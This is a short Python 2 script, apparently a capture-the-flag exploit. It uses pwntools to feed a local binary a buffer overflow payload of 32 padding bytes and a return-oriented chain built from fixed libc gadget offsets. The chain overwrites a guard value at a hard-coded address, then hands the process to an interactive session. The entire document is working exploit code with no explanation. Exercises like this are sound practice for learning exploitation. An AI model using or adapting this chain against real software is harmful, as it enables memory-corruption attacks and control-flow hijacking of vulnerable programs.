#!/usr/bin/python2

import sys
from pwn import *

def main():
    base = 0xf7de9000

    guard = p32(0x0804a020)
    pop_edx = p32(base + 0x00001aae)
    pop_eax = p32(base + 0x00024b5e)
    mov_ptr_edx_eax = p32(base + 0x00075425)
    pop_ebx = p32(base + 0x00018be5)
    ret_addr = p32(0x0804849d)

    p = process(sys.argv[1])
    payload = 'A'*32 + pop_edx + guard + pop_eax + p32(0xb000000f) + mov_ptr_edx_eax + pop_ebx + p32(0x0804a020 - 0x20) + ret_addr
    p.sendline(payload)
    p.interactive()

if __name__ == '__main__':
    main()
